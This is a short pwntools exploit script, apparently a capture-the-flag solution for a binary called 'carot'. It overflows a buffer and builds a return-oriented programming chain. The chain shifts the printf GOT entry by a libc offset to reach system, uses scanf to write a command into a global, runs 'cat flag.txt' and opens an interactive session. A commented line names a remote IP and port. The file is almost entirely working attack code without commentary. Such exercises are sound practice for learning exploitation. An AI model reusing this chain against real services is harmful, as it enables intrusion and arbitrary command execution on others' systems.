from pwn import *

# p = process('carot')
# p = remote('167.99.78.201', 11451)
p = remote('localhost', 11451)
e = ELF('carot')
libc = ELF('libc-2.31.so')

# 0x0000000000400828 : pop rbp ; ret
# 0x0000000000400b7d : mov rax, qword ptr [rbp - 8] ; add rsp, 0x10 ; pop rbp ; ret
# 0x00000000004010ca : pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret 
# 0x0000000000400cae : mov qword ptr [rbp - 0x30], rax ; jmp 0x400cc6
# 0x0000000000400cc6 : add rsp, 0x30 ; pop rbp ; ret
# 0x0000000000400888 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret
# 0x00000000004010d3 : pop rdi ; ret
# 0x00000000004010d1 : pop rsi ; pop r15 ; ret  
# 0x0000000000400828 : pop rbp ; ret  
# 0x00000000004014fb : jmp qword ptr [rbp]

pop_rbp = 0x400828
mov_rax_rbp_8 = 0x400b7d
pop_rbx_rbp = 0x4010ca 
mov_rbp_0x30_rax = 0x400cae
add_rbp_0x3d_ebx = 0x400888
pop_rdi = 0x4010d3
pop_rsi = 0x4010d1
pop_rbp = 0x400828
jmp_rbp = 0x4014fb
ret = 0x4006d6

offset = (libc.symbols['system'] - libc.symbols['printf']) & 0xffffffff
writable = 0x602000 
scanf_format = 0x4012f0


payload = b'A' * 0x218

# writable = system
payload += p64(pop_rbp)
payload += p64(e.got['printf'] + 8)
payload += p64(mov_rax_rbp_8)
payload += b'AAAAAAAA' * 3
payload += p64(pop_rbx_rbp)
payload += p64(offset)
payload += p64(writable + 0x30)
payload += b'AAAAAAAA' * 4
payload += p64(mov_rbp_0x30_rax)
payload += b'AAAAAAAA' * 6
payload += p64(writable + 0x3d)
payload += p64(add_rbp_0x3d_ebx)

# gif = "cat flag.txt"
payload += p64(pop_rdi)
payload += p64(scanf_format)
payload += p64(pop_rsi)
payload += p64(e.symbols['gif'])
payload += b'AAAAAAAA'
payload += p64(e.plt['__isoc99_scanf'])

# system("cat flag.txt")
payload += p64(pop_rdi)
payload += p64(e.symbols['gif'])
payload += p64(pop_rbp)
payload += p64(writable)
payload += p64(ret)
payload += p64(jmp_rbp)

p.sendline(payload)
p.sendline(b'cat flag.txt')
p.sendline()

p.interactive()
